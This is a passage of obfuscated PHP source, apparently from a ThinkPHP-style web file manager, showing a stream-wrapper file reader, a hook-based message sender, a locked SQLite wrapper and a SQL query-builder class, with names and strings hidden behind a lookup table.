($ä‘ÎœÀ == SEEK_CUR) { $this->pose += $ÙæÅîÕµ; } else { if ($ä‘ÎœÀ == SEEK_END) { $this->pose = $this->info[$ï‘øòå«[89]] + intval($ÙæÅîÕµ); } } } if ($ÙæÅîÕµ < 0) { $this->pose = $this->info[$ï‘øòå«[89]] + $ÙæÅîÕµ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÕŸ²ó÷å][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($»ô°¦€¶, $³Ë¥½) { $½û© ¡ã =& $_SERVER[ÕŸ²ó÷å]; $ÍÜáâí = $this->info($»ô°¦€¶); return array($½û© ¡ã[1609] => 0, $½û© ¡ã[1610] => 0, $½û© ¡ã[16] => 32768 + 511, $½û© ¡ã[1611] => 0, $½û© ¡ã[1612] => 0, $½û© ¡ã[1613] => 0, $½û© ¡ã[1614] => 0, $½û© ¡ã[89] => $ÍÜáâí[$½û© ¡ã[89]], $½û© ¡ã[1615] => $ÍÜáâí[$½û© ¡ã[1455]], $½û© ¡ã[1571] => $ÍÜáâí[$½û© ¡ã[98]], $½û© ¡ã[1570] => $ÍÜáâí[$½û© ¡ã[241]], $½û© ¡ã[1616] => 0, $½û© ¡ã[1617] => 0); } static $fileInfo = array(); public function info($ ïìÍ¾) { $™‰ç‚İ = $_SERVER[ÕŸ²ó÷å][1618]; if (isset(self::$fileInfo[$ ïìÍ¾])) { return self::$fileInfo[$ ïìÍ¾]; } if (substr($ ïìÍ¾, 0, strlen($™‰ç‚İ)) != $™‰ç‚İ) { return !1; } self::$fileInfo[$ ïìÍ¾] = IO::info(substr($ ïìÍ¾, strlen($™‰ç‚İ))); return self::$fileInfo[$ ïìÍ¾]; } public static function read($Ô£¾ıæÉ, $Œ¦ò¶¨Š, $ÁÉ¼Ï‰ä) { if (!isset(self::$_fopenCache[$Ô£¾ıæÉ])) { $ê¡¡¦œÌ = new StreamWrapperIO(); $ê¡¡¦œÌ->stream_open($Ô£¾ıæÉ); self::$_fopenCache[$Ô£¾ıæÉ] = $ê¡¡¦œÌ; } $ê¡¡¦œÌ = self::$_fopenCache[$Ô£¾ıæÉ]; return $ê¡¡¦œÌ->fileSubstr($Œ¦ò¶¨Š, $ÁÉ¼Ï‰ä); } public static function _read($ŠáŸ²÷â, $âÚáæÂÓ, $›ŒÕ®ª©) { $ë³àğ°¯ =& $_SERVER[ÕŸ²ó÷å]; $ÈÊİ§ı‹ = fopen($ŠáŸ²÷â, $ë³àğ°¯[1459]); if (!$ÈÊİ§ı‹) { return $ë³àğ°¯[12]; } $ËÓ¸Ï‚½ = 8192; fseek($ÈÊİ§ı‹, $âÚáæÂÓ, SEEK_SET); $®ÒÉêø = $ë³àğ°¯[12]; $ïÅñÃÉ— = 0; while ($ïÅñÃÉ— < $›ŒÕ®ª©) { $Á¼¾¢Øõ = min($ËÓ¸Ï‚½, $›ŒÕ®ª© - $ïÅñÃÉ—); $®ÒÉêø .= fread($ÈÊİ§ı‹, $Á¼¾¢Øõ); $ïÅñÃÉ— += $Á¼¾¢Øõ; } fclose($ÈÊİ§ı‹); return $®ÒÉêø; } public function fileSubstr($ºüÏ¶¿Í, $„Ø™‚é“) { $ºÂò¸¢¦ =& $_SERVER[ÕŸ²ó÷å]; $æûö´ã = $this->info[$ºÂò¸¢¦[89]]; $¼¸ç†ÉÌ = $ºüÏ¶¿Í; $óõÉ¼ü = $„Ø™‚é“; if ($ºüÏ¶¿Í < 0) { $ºüÏ¶¿Í = $æûö´ã + $ºüÏ¶¿Í; } if ($„Ø™‚é“ === !1) { $„Ø™‚é“ = $æûö´ã - $ºüÏ¶¿Í; } if ($ºüÏ¶¿Í + $„Ø™‚é“ > $æûö´ã) { $„Ø™‚é“ = $æûö´ã - $ºüÏ¶¿Í; } if ($„Ø™‚é“ <= 0) { return $ºÂò¸¢¦[12]; } if ($ºüÏ¶¿Í < 0 || $ºüÏ¶¿Í >= $æûö´ã || $„Ø™‚é“ <= 0 || $„Ø™‚é“ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\145\122\x65\141\x64\40\x65\162\x72\x6f\x72\x21\40\x73\164\141\x72\164\x3d{$ºüÏ¶¿Í}\x3b\x6c\x65\x6e\x67\x74\x68\75{$„Ø™‚é“}\x3b\x20\163\x69\172\145\75{$æûö´ã}\x3b"); } $³Á§ ‡ = 64 * 1024; $òı¼˜© =& self::$_chunkBuffer[$this->path]; if (!$òı¼˜©) { $òı¼˜© = array(); } $àúÑ¸¢ = 0; $˜ş®¾øŸ = 0; $ç¡¤Ãóç = $ºÂò¸¢¦[12]; foreach ($òı¼˜© as $àúÑ¸¢ => $ç¡¤Ãóç) { $àúÑ¸¢ = intval($àúÑ¸¢); $˜ş®¾øŸ = $àúÑ¸¢ + strlen($ç¡¤Ãóç); if ($ºüÏ¶¿Í >= $˜ş®¾øŸ) { continue; } if ($ºüÏ¶¿Í >= $àúÑ¸¢ && $ºüÏ¶¿Í + $„Ø™‚é“ <= $˜ş®¾øŸ) { return substr($ç¡¤Ãóç, $ºüÏ¶¿Í - $àúÑ¸¢, $„Ø™‚é“); } break; } if (count($òı¼˜©) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ºÂò¸¢¦[1619], $ºÂò¸¢¦[1620] . count($òı¼˜©) . "\x3b\163\x74\x61\162\x74\x3d{$ºüÏ¶¿Í}\54\x6c\x65\x6e\147\164\150\75{$„Ø™‚é“}\73\x70\157\163\145\x3a{$àúÑ¸¢}\x7e{$˜ş®¾øŸ}"); throw new Exception($ºÂò¸¢¦[1621]); } $É÷³‰ŞŸ = intval($ºüÏ¶¿Í / $³Á§ ‡) * $³Á§ ‡; $˜òÑ­Ğí = ceil(($ºüÏ¶¿Í + $„Ø™‚é“) / $³Á§ ‡) * $³Á§ ‡ - $É÷³‰ŞŸ; $Ù¶øº—Š = IO::fileSubstr($this->path, $É÷³‰ŞŸ, $˜òÑ­Ğí); $òı¼˜©[$É÷³‰ŞŸ . $ºÂò¸¢¦[12]] = $Ù¶øº—Š; ksort($òı¼˜©); $Ç°»Ë‚ø = substr($Ù¶øº—Š, $ºüÏ¶¿Í - $É÷³‰ŞŸ, $„Ø™‚é“); return $Ç°»Ë‚ø; } private function log($–ŒÙÅÅí, $Œ¾–ÖëŠ) { $¨ÅİÉ‚ò =& $_SERVER[ÕŸ²ó÷å]; $şşñå… = timeFloat() - $this->timeStart; write_log(sprintf($¨ÅİÉ‚ò[1622], $–ŒÙÅÅí, $this->info[$¨ÅİÉ‚ò[32]], $şşñå…, $Œ¾–ÖëŠ), $¨ÅİÉ‚ò[1267]); } } class Message { function __construct() { } public function send($Ã¿ÑÊë = '', $ûéÌ¾×· = array(), $ÔÁ™Ñ · = "\164\145\170\164") { $Êå¸©Ê =& $_SERVER[ÕŸ²ó÷å]; $­¥òşãÁ = array($Êå¸©Ê[33] => $Êå¸©Ê[1623], $Êå¸©Ê[181] => $Ã¿ÑÊë); if (in_array($ÔÁ™Ñ ·, array($Êå¸©Ê[1623], $Êå¸©Ê[1624]))) { $­¥òşãÁ[$Êå¸©Ê[33]] = $ÔÁ™Ñ ·; } $ûéÌ¾×· = array($Êå¸©Ê[587] => isset($ûéÌ¾×·[$Êå¸©Ê[587]]) ? $ûéÌ¾×·[$Êå¸©Ê[587]] : $Êå¸©Ê[12], $Êå¸©Ê[671] => isset($ûéÌ¾×·[$Êå¸©Ê[671]]) ? $ûéÌ¾×·[$Êå¸©Ê[671]] : $Êå¸©Ê[12]); if (empty($Ã¿ÑÊë) || empty($ûéÌ¾×·[$Êå¸©Ê[587]]) && empty($ûéÌ¾×·[$Êå¸©Ê[671]])) { return !1; } $²´Û…Àä = array($Êå¸©Ê[1551] => $­¥òşãÁ, $Êå¸©Ê[1625] => $ûéÌ¾×·); Hook::trigger($Êå¸©Ê[1626], $²´Û…Àä); } } goto dÒ¾öÛ­ªò; CÅ”ƒ‚…ö: class DbSqlite3 extends DbSqlite3Base { public function query($ŒÄ¡€¼×) { $ûøÜĞÔó =& $_SERVER[ÕŸ²ó÷å]; if (!CacheLock::fileLock($ûøÜĞÔó[13])) { return !1; } $®‚…˜­ä = parent::query($ŒÄ¡€¼×); CacheLock::fileUnLock($ûøÜĞÔó[13]); return $®‚…˜­ä; } public function execute($õæ¢àäü) { $€Õ“ÄÏì =& $_SERVER[ÕŸ²ó÷å]; if (!CacheLock::fileLock($€Õ“ÄÏì[13])) { return !1; } $ú‡ÕñÁ­ = parent::execute($õæ¢àäü); CacheLock::fileUnLock($€Õ“ÄÏì[13]); return $ú‡ÕñÁ­; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\145\161" => "\74\76", "\x67\164" => "\x3e", "\145\x67\164" => "\76\x3d", "\154\164" => "\74", "\145\154\164" => "\74\75", "\x6e\157\164\x6c\151\153\x65" => "\116\117\x54\40\114\111\113\105", "\154\x69\153\145" => "\x4c\111\113\x45", "\151\x6e" => "\x49\116", "\x6e\157\164\x69\x6e" => "\x4e\x4f\124\40\111\x4e", "\x6e\x6f\164\40\151\156" => "\x4e\117\x54\40\111\x4e", "\142\145\x74\167\x65\145\x6e" => "\102\x45\x54\127\105\x45\x4e", "\156\157\164\142\145\164\167\145\145\x6e" => "\x4e\x4f\x54\x20\102\x45\124\127\105\x45\x4e", "\156\x6f\164\x20\x62\145\164\x77\145\x65\156" => "\x4e\117\x54\40\102\x45\124\x57\105\x45\x4e"); protected $selectSql = "\123\105\114\x45\103\124\45\104\x49\123\x54\111\x4e\x43\x54\45\40\x25\x46\x49\105\x4c\104\45\x20\x46\122\x4f\x4d\40\x25\x54\101\102\x4c\x45\45\45\112\x4f\x49\x4e\x25\45\x57\110\x45\122\x45\x25\x25\x47\122\117\x55\x50\45\x25\110\x41\x56\111\116\107\x25\x25\x4f\x52\104\x45\122\45\45\x4c\111\115\x49\x54\45\x20\x25\125\x4e\x49\x4f\116\45\45\x43\x4f\115\115\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $í¼ĞßóØ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÕŸ²ó÷å][1041], $í¼ĞßóØ); } public function factory($ùî•³ƒæ = '') { $ìëüĞ¡í =& $_SERVER[ÕŸ²ó÷å]; $ùî•³ƒæ = $this->parseConfig($ùî•³ƒæ); if (empty($ùî•³ƒæ[$ìëüĞ¡í[1042]])) { think_exception(think_lang($ìëüĞ¡í[1043])); } $this->dbType = ucwords(strtolower($ùî•³ƒæ[$ìëüĞ¡í[1042]])); $Éµî÷‰ = $ìëüĞ¡í[1044] . $this->dbType; if (class_exists($Éµî÷‰)) { $™¦ùèÛ = new $Éµî÷‰($ùî•³ƒæ); if ($ìëüĞ¡í[1045] != strtolower($ùî•³ƒæ[$ìëüĞ¡í[1042]])) { $™¦ùèÛ->dbType = strtoupper($this->dbType); } else { $™¦ùèÛ->dbType = $this->_getDsnType($ùî•³ƒæ[$ìëüĞ¡í[997]]); } } else { think_exception(think_lang($ìëüĞ¡í[1046]) . $ìëüĞ¡í[1047] . $Éµî÷‰); } return $™¦ùèÛ; } public function __call($ŠêÈ¬ÏŞ, $¨½úŠŒ) { if (method_exists($this, $ŠêÈ¬ÏŞ)) { return call_user_func_array(array($this, $ŠêÈ¬ÏŞ), $¨½úŠŒ); } } protected function _getDsnType($ä›ú¿½) { $°Şû®¢ = explode($_SERVER[ÕŸ²ó÷å][4], $ä›ú¿½); $Œ€‡¦ºÏ = strtoupper(trim($°Şû®¢[0])); return $Œ€‡¦ºÏ; } private function parseConfig($è½åˆ³ä = '') { $ğù¥¹®ğ =& $_SERVER[ÕŸ²ó÷å]; if (!empty($è½åˆ³ä) && is_string($è½åˆ³ä)) { $è½åˆ³ä = $this->parseDSN($è½åˆ³ä); } elseif (is_array($è½åˆ³ä)) { $è½åˆ³ä = array_change_key_case($è½åˆ³ä); $è½åˆ³ä = array($ğù¥¹®ğ[1042] => $è½åˆ³ä[$ğù¥¹®ğ[1048]], $ğù¥¹®ğ[969] => $è½åˆ³ä[$ğù¥¹®ğ[1049]], $ğù¥¹®ğ[970] => $è½åˆ³ä[$ğù¥¹®ğ[1050]], $ğù¥¹®ğ[967] => $è½åˆ³ä[$ğù¥¹®ğ[1051]], $ğù¥¹®ğ[968] => $è½åˆ³ä[$ğù¥¹®ğ[1052]], $ğù¥¹®ğ[21] => $è½åˆ³ä[$ğù¥¹®ğ[1053]], $ğù¥¹®ğ[997] => $è½åˆ³ä[$ğù¥¹®ğ[1054]], $ğù¥¹®ğ[17] => isset($è½åˆ³ä[$ğù¥¹®ğ[1055]]) ? $è½åˆ³ä[$ğù¥¹®ğ[1055]] : array()); } elseif (empty($è½åˆ³ä)) { if (think_config($ğù¥¹®ğ[1056]) && $ğù¥¹®ğ[1045] != strtolower(think_config($ğù¥¹®ğ[1057]))) { $è½åˆ³ä = $this->parseDSN(think_config($ğù¥¹®ğ[1056])); } else { $è½åˆ³ä = array($ğù¥¹®ğ[1042] => think_config($ğù¥¹®ğ[1057]), $ğù¥¹®ğ[969] => think_config($ğù¥¹®ğ[1058]), $ğù¥¹®ğ[970] => think_config($ğù¥¹®ğ[1059]), $ğù¥¹®ğ[967] => think_config($ğù¥¹®ğ[1060]), $ğù¥¹®ğ[968] => think_config($ğù¥¹®ğ[1061]), $ğù¥¹®ğ[21] => think_config($ğù¥¹®ğ[332]), $ğù¥¹®ğ[997] => think_config($ğù¥¹®ğ[1056]), $ğù¥¹®ğ[17] => think_config($ğù¥¹®ğ[1062])); } } return $è½åˆ³ä; } protected function initConnect($ ¯¾Üüí = true) { if (1 == think_config($_SERVER[ÕŸ²ó÷å][22])) { $this->_linkID = $this->multiConnect($ ¯¾Üüí); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ú«ˆ‰½ => $şÕÀ‰¢¤) { $this->_linkID = $şÕÀ‰¢¤; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ö˜«‘Şã = false) { $÷ª¤µ¸ =& $_SERVER[ÕŸ²ó÷å]; static $ı©ô¿·± = array(); static $…ß«¦Š» = -1; if (empty($ı©ô¿·±)) { foreach ($this->config as $¤ö– ßÍ => $ñ­Ø½é°) { $ı©ô¿·±[$¤ö– ßÍ] = explode($÷ª¤µ¸[50], $ñ­Ø½é°); } } if (think_config($÷ª¤µ¸[1063])) { if ($Ö˜«‘Şã || think_config($÷ª¤µ¸[480]) === !0) { $š¯á¹°“ = floor(mt_rand(0, think_config($÷ª¤µ¸[1064]) - 1)); $…ß«¦Š» = $š¯á¹°“; } else { if (is_numeric(think_config($÷ª¤µ¸[1065]))) { $š¯á¹°“ = think_config($÷ª¤µ¸[1065]); } else { $š¯á¹°“ = floor(mt_rand(think_config($÷ª¤µ¸[1064]), count($ı©ô¿·±[$÷ª¤µ¸[967]]) - 1)); } } } else { $š¯á¹°“ = floor(mt_rand(0, count($ı©ô¿·±[$÷ª¤µ¸[967]]) - 1)); $…ß«¦Š» = $š¯á¹°“; } $š¯á¹°“ = $…ß«¦Š» !== -1 ? $…ß«¦Š» : $š¯á¹°“; $õ©¤±¾¨ = array($÷ª¤µ¸[969] => isset($ı©ô¿·±[$÷ª¤µ¸[969]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[969]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[969]][0], $÷ª¤µ¸[970] => isset($ı©ô¿·±[$÷ª¤µ¸[970]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[970]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[970]][0], $÷ª¤µ¸[967] => isset($ı©ô¿·±[$÷ª¤µ¸[967]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[967]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[967]][0], $÷ª¤µ¸[968] => isset($ı©ô¿·±[$÷ª¤µ¸[968]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[968]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[968]][0], $÷ª¤µ¸[21] => isset($ı©ô¿·±[$÷ª¤µ¸[21]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[21]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[21]][0], $÷ª¤µ¸[997] => isset($ı©ô¿·±[$÷ª¤µ¸[997]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[997]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[997]][0], $÷ª¤µ¸[17] => isset($ı©ô¿·±[$÷ª¤µ¸[17]][$š¯á¹°“]) ? $ı©ô¿·±[$÷ª¤µ¸[17]][$š¯á¹°“] : $ı©ô¿·±[$÷ª¤µ¸[17]][0]); return $this->connect($õ©¤±¾¨, $š¯á¹°“); } public function parseDSN($œÒ‰Â£á) { $­Œ±ËÓ‘ =& $_SERVER[ÕŸ²ó÷å]; if (empty($œÒ‰Â£á)) { return !1; } $ÂùıÙúê = parse_url($œÒ‰Â£á); if ($ÂùıÙúê[$­Œ±ËÓ‘[217]]) { $ÀÛÒÑ¿– = array($­Œ±ËÓ‘[1042] => $ÂùıÙúê[$­Œ±ËÓ‘[217]], $­Œ±ËÓ‘[969] => isset($ÂùıÙúê[$­Œ±ËÓ‘[671]]) ? $ÂùıÙúê[$­Œ±ËÓ‘[671]] : $­Œ±ËÓ‘[12], $­Œ±ËÓ‘[970] => isset($ÂùıÙúê[$­Œ±ËÓ‘[1066]]) ? $ÂùıÙúê[$­Œ±ËÓ‘[1066]] : $­Œ±ËÓ‘[12], $­Œ±ËÓ‘[967] => isset($ÂùıÙúê[$­Œ±ËÓ‘[218]]) ? $ÂùıÙúê[$­Œ±ËÓ‘[218]] : $­Œ±ËÓ‘[12], $­Œ±ËÓ‘[968] => isset($ÂùıÙúê[$­Œ±ËÓ‘[219]]) ? $ÂùıÙúê[$­Œ±ËÓ‘[219]] : $­Œ±ËÓ‘[12], $­Œ±ËÓ‘[21] => isset($ÂùıÙúê[$­Œ±ËÓ‘[97]]) ? substr($ÂùıÙúê[$­Œ±ËÓ‘[97]], 1) : $­Œ±ËÓ‘[12]); } else { preg_match($­Œ±ËÓ‘[1067], trim($œÒ‰Â£á), $Àˆüáºï); $ÀÛÒÑ¿– = array($­Œ±ËÓ‘[1042] => $Àˆüáºï[1], $­Œ±ËÓ‘[969] => $Àˆüáºï[2], $­Œ±ËÓ‘[970] => $Àˆüáºï[3], $­Œ±ËÓ‘[967] => $Àˆüáºï[4], $­Œ±ËÓ‘[968] => $Àˆüáºï[5], $­Œ±ËÓ‘[21] => $Àˆüáºï[6]); } $ÀÛÒÑ¿–[$­Œ±ËÓ‘[997]] = $­Œ±ËÓ‘[12]; return $ÀÛÒÑ¿–; } protected function debug() { $ŠË”¾èğ =& $_SERVER[ÕŸ²ó÷å]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ŠË”¾èğ[1068]; if (think_config($ŠË”¾èğ[1069])) { think_status($ŠË”¾èğ[1070]); think_trace($this->queryStr . $ŠË”¾èğ[1071] . think_status($ŠË”¾èğ[24], $ŠË”¾èğ[1070], 6) . $ŠË”¾èğ[1072], $ŠË”¾èğ[12], $ŠË”¾èğ[1073]); } } protected function parseLock($ÍÀûöíÂ = false) { $¤şè”¡„ =& $_SERVER[ÕŸ²ó÷å]; if (!$ÍÀûöíÂ) { return $¤şè”¡„[12]; } if ($¤şè”¡„[999] == $this->dbType) { return $¤şè”¡„[1074]; } return $¤şè”¡„[1075]; } protected function parseSet($ÚøŒÄ‹“) { $ÄÎŠºèÓ =& $_SERVER[ÕŸ²ó÷å]; foreach ($ÚøŒÄ‹“ as $®Àû‡œü => $×’Â•¼) { if (is_array($×’Â•¼) && $ÄÎŠºèÓ[382] == $×’Â•¼[0]) { $ÔÇ­·–·[] = $this->parseKey($®Àû‡œü) . $ÄÎŠºèÓ[515] . $×’Â•¼[1]; } elseif (is_scalar($×’Â•¼) || is_null($×’Â•¼)) { $ÔÇ­·–·[] = $this->parseKey($®Àû‡œü) . $ÄÎŠºèÓ[515] . $this->parseValue($×’Â•¼); } } return $ÄÎŠºèÓ[1076] . implode($ÄÎŠºèÓ[50], $ÔÇ­·–·); } protected function bindParam($©‡ş×ğ­, $ø¹ˆ‹…) { $this->bind[$_SERVER[ÕŸ²ó÷å][4] . $©‡ş×ğ­] = $ø¹ˆ‹…; } protected function parseBind($ûÓÁÅÒ²) { $ûÓÁÅÒ² = array_merge($this->bind, $ûÓÁÅÒ²); $this->bind = array(); return $ûÓÁÅÒ²; } function parseKey(&$êëÚ¦ãÒ, $‹¹•¯Ìß = true) { if ($‹¹•¯Ìß) { $êëÚ¦ãÒ = $this->parseKeyCheck($êëÚ¦ãÒ); } return $êëÚ¦ãÒ; } function parseKeyCheck($±±³ÈÇÑ) { $ˆµ‰çáÄ =& $_SERVER[ÕŸ²ó÷å]; $±±³ÈÇÑ = trim($±±³ÈÇÑ); if (!preg_match($ˆµ‰çáÄ[1077], $±±³ÈÇÑ)) { think_exception($ˆµ‰çáÄ[1078] . $±±³ÈÇÑ); } return $±±³ÈÇÑ; } protected function parseValue($óõÀí±) { $ª‰ä…ëè =& $_SERVER[ÕŸ²ó÷å]; if (is_string($óõÀí±)) { $óõÀí± = $ª‰ä…ëè[1038] . $this->escapeString($óõÀí±) . $ª‰ä…ëè[1038]; } elseif (isset($óõÀí±[0]) && is_string($óõÀí±[0]) && strtolower($óõÀí±[0]) == $ª‰ä…ëè[382]) { $óõÀí± = $this->escapeString($óõÀí±[1]); } elseif (is_array($óõÀí±)) { $óõÀí± = array_map(array($this, $ª‰ä…ëè[1039]), $óõÀí±); } elseif (is_bool($óõÀí±)) { $óõÀí± = $óõÀí± ? $ª‰ä…ëè[101] : $ª‰ä…ëè[238]; } elseif (is_null($óõÀí±)) { $óõÀí± = $ª‰ä…ëè[116]; } return $óõÀí±; } protected function parseField($•ÕÌí¥ğ) { $¼È†ù½ =& $_SERVER[ÕŸ²ó÷å]; if (is_string($•ÕÌí¥ğ) && strpos($•ÕÌí¥ğ, $¼È†ù½[50])) { $•ÕÌí¥ğ = explode($¼È†ù½[50], $•ÕÌí¥ğ); } if (is_array($•ÕÌí¥ğ)) { $¯…İ‹ = array(); foreach ($•ÕÌí¥ğ as $Œµ¥¦ğ => $¿çæ³Œ) { if (!is_numeric($Œµ¥¦ğ)) { $¯…İ‹[] = $this->parseKey($Œµ¥¦ğ, !1) . $¼È†ù½[1079] . $this->parseKey($¿çæ³Œ); } else { $¯…İ‹[] = $this->parseKey($¿çæ³Œ); } } $¼ßóºİÓ = implode($¼È†ù½[50], $¯…İ‹); } elseif (is_string($•ÕÌí¥ğ) && !empty($•ÕÌí¥ğ)) { $¼ßóºİÓ = $•ÕÌí¥ğ; } else { $¼ßóºİÓ = $¼È†ù½[230]; } return $¼ßóºİÓ; } protected function parseTable($ë¤ÆÍâø) { $«‚ßı®ú =& $_SERVER[ÕŸ²ó÷å]; if (is_array($ë¤ÆÍâø)) { $ÇÆ°—Ÿï = array(); foreach ($ë¤ÆÍâø as $çİÇÓÓÜ => $ÚË€óñÛ) { if (!is_numeric($çİÇÓÓÜ)) { $ÇÆ°—Ÿï[] = $this->parseKey($çİÇÓÓÜ) . $«‚ßı®ú[53] . $this->parseKey($ÚË€óñÛ); } else { $ÇÆ°—Ÿï[] = $this->parseKey($çİÇÓÓÜ); } } $ë¤ÆÍâø = $ÇÆ°—Ÿï; } elseif (is_string($ë¤ÆÍâø)) { if (strstr($ë¤ÆÍâø, $«‚ßı®ú[53])) { return $ë¤ÆÍâø; } $ë¤ÆÍâø = explode($«‚ßı®ú[50], $ë¤ÆÍâø); array_walk($ë¤ÆÍâø, array($this, $«‚ßı®ú[987])); } return $«‚ßı®ú[981] . trim(implode($«‚ßı®ú[1080], $ë¤ÆÍâø), $«‚ßı®ú[470]) . $«‚ßı®ú[981]; } protected function parseWhere($¯ŞŸö²¸) { $Ñ„²€× =& $_SERVER[ÕŸ²ó÷å]; $î¼³ÚÓÑ = $Ñ„²€×[12]; if (is_string($¯ŞŸö²¸)) { $î¼³ÚÓÑ = $¯ŞŸö²¸; } else { $‘©¥Òû = isset($¯ŞŸö²¸[$Ñ„²€×[1081]]) ? strtoupper($¯ŞŸö²¸[$Ñ„²€×[1081]]) : $Ñ„²€×[12]; if (in_array($‘©¥Òû, array($Ñ„²€×[1082], $Ñ„²€×[1083], $Ñ„²€×[1084]))) { $‘©¥Òû = $Ñ„²€×[53] . $‘©¥Òû . $Ñ„²€×[53]; unset($¯ŞŸö²¸[$Ñ„²€×[1081]]); } else { $‘©¥Òû = $Ñ„²€×[1085]; } foreach ($¯ŞŸö²¸ as $¨ğÖİàå => $Ùà†½”Ü) { $î¼³ÚÓÑ .= $Ñ„²€×[363]; if (is_numeric($¨ğÖİàå)) { $¨ğÖİàå = $Ñ„²€×[1086]; } if (0 === strpos($¨ğÖİàå, $Ñ„²€×[11])) { $î¼³ÚÓÑ .= $this->parseThinkWhere($¨ğÖİàå, $Ùà†½”Ü); } else { if (!preg_match($Ñ„²€×[1087], trim($¨ğÖİàå))) { think_exception(think_lang($Ñ„²€×[1088]) . $Ñ„²€×[4] . $¨ğÖİàå); } $ö¿ıÅµ = is_array($Ùà†½”Ü) && isset($Ùà†½”Ü[$Ñ„²€×[1089]]); $¨ğÖİàå = trim($¨ğÖİàå); if (strpos($¨ğÖİàå, $Ñ„²€×[224])) { $áß«î = explode($Ñ„²€×[224], $¨ğÖİàå); $™ş™Ï = array(); foreach ($áß«î as $Âñ«òàİ => $‘±‹µìò) { $¶„ğüş´ = $ö¿ıÅµ ? $Ùà†½”Ü[$Âñ«òàİ] : $Ùà†½”Ü; $™ş™Ï[] = $Ñ„²€×[346] . $this->parseWhereItem($this->parseKey($‘±‹µìò), $¶„ğüş´) . $Ñ„²€×[986]; } $î¼³ÚÓÑ .= implode($Ñ„²€×[1090], $™ş™Ï); } elseif (strpos($¨ğÖİàå, $Ñ„²€×[369])) { $áß«î = explode($Ñ„²€×[369], $¨ğÖİàå); $™ş™Ï = array(); foreach ($áß«î as $Âñ«òàİ => $‘±‹µìò) { $¶„ğüş´ = $ö¿ıÅµ ? $Ùà†½”Ü[$Âñ«òàİ] : $Ùà†½”Ü; $™ş™Ï[] = $Ñ„²€×[346] . $this->parseWhereItem($this->parseKey($‘±‹µìò), $¶„ğüş´) . $Ñ„²€×[986]; } $î¼³ÚÓÑ .= implode($Ñ„²€×[1085], $™ş™Ï); } else { $î¼³ÚÓÑ .= $this->parseWhereItem($this->parseKey($¨ğÖİàå), $Ùà†½”Ü); } } $î¼³ÚÓÑ .= $Ñ„²€×[364] . $‘©¥Òû; } $î¼³ÚÓÑ = substr($î¼³ÚÓÑ, 0, -strlen($‘©¥Òû)); } return empty($î¼³ÚÓÑ) ? $Ñ„²€×[12] : $Ñ„²€×[1091] . $î¼³ÚÓÑ; } protected function parseWhereItem($çî €¹, $×ğÛƒôé) { $ƒ—â´ûŒ =& $_SERVER[ÕŸ²ó÷å]; $¶åö¯ÍŸ = $ƒ—â´ûŒ[12]; if (is_array($×ğÛƒôé)) { if (is_string($×ğÛƒôé[0])) { $Û‚´…Ò = strtolower($×ğÛƒôé[0]); if (in_array($×ğÛƒôé[0], array($ƒ—â´ûŒ[515], $ƒ—â´ûŒ[1092], $ƒ—â´ûŒ[1093], $ƒ—â´ûŒ[1094], $ƒ—â´ûŒ[1095], $ƒ—â´ûŒ[1096]))) { $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[53] . $×ğÛƒôé[0] . $ƒ—â´ûŒ[53] . $this->parseValue($×ğÛƒôé[1]); } elseif (preg_match($ƒ—â´ûŒ[1097], $×ğÛƒôé[0])) { $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[53] . $this->parseValue($×ğÛƒôé[1]); } elseif (preg_match($ƒ—â´ûŒ[1098], $×ğÛƒôé[0])) { if (is_array($×ğÛƒôé[1])) { $Æ³ÍŸ = isset($×ğÛƒôé[2]) ? strtoupper($×ğÛƒôé[2]) : $ƒ—â´ûŒ[1083]; if (in_array($Æ³ÍŸ, array($ƒ—â´ûŒ[1082], $ƒ—â´ûŒ[1083], $ƒ—â´ûŒ[1084]))) { $¾ŞâÂ–— = array(); foreach ($×ğÛƒôé[1] as $°ºÜî­) { $¾ŞâÂ–—[] = $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[53] . $this->parseValue($°ºÜî­); } $¶åö¯ÍŸ .= $ƒ—â´ûŒ[346] . implode($ƒ—â´ûŒ[53] . $Æ³ÍŸ . $ƒ—â´ûŒ[53], $¾ŞâÂ–—) . $ƒ—â´ûŒ[986]; } } else { $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[53] . $this->parseValue($×ğÛƒôé[1]); } } elseif 